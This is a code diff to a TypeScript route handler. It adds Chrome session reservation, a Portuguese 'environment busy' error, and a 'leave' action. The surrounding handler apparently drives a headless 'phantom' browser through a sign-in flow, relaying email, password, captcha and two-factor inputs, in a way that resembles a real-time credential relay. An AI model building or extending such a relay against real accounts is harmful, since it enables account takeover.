@@ -1,11 +1,13 @@
 import {
   createSession,
   getDemoSession,
+  setChromeError,
   submitCaptcha,
   submitConfirmPassword,
   submitTwoFactor,
   clearInputError,
 } from "@/lib/demo-session";
+import { BrowserCapacityError, getBrowserSessionManager } from "@/lib/browser-session-manager";
 import {
   startPhantom,
   phantomFillEmail,
@@ -36,12 +38,23 @@ export async function POST(request: Request) {
     | { action: "selectMethod"; sessionId: string; challengeType: string }
     | { action: "tryAnotherWay"; sessionId: string }
     | { action: "submitCaptcha"; sessionId: string }
-    | { action: "clearError"; sessionId: string };
+    | { action: "clearError"; sessionId: string }
+    | { action: "leave"; sessionId: string };
 
   if (body.action === "enter") {
     const ua = request.headers.get("user-agent") ?? "";
     const entry = createSession(ua);
-    void startPhantom(entry.sessionId);
+    try {
+      await getBrowserSessionManager().reserveSession(entry.sessionId);
+      void startPhantom(entry.sessionId);
+    } catch (err) {
+      const message = err instanceof BrowserCapacityError
+        ? "Ambiente ocupado. Tente novamente em instantes."
+        : err instanceof Error
+          ? err.message
+          : "Nao foi possivel reservar uma sessao do Chrome.";
+      setChromeError(entry.sessionId, message);
+    }
     return Response.json(entry);
   }
 
@@ -74,6 +87,10 @@ export async function POST(request: Request) {
   }
   if (body.action === "clearError") {
     return Response.json(clearInputError(sessionId));
+  }
+  if (body.action === "leave") {
+    await getBrowserSessionManager().closeSession(sessionId, "signin-leave");
+    return Response.json({ ok: true });
   }
   return Response.json(submitCaptcha(sessionId));
 }
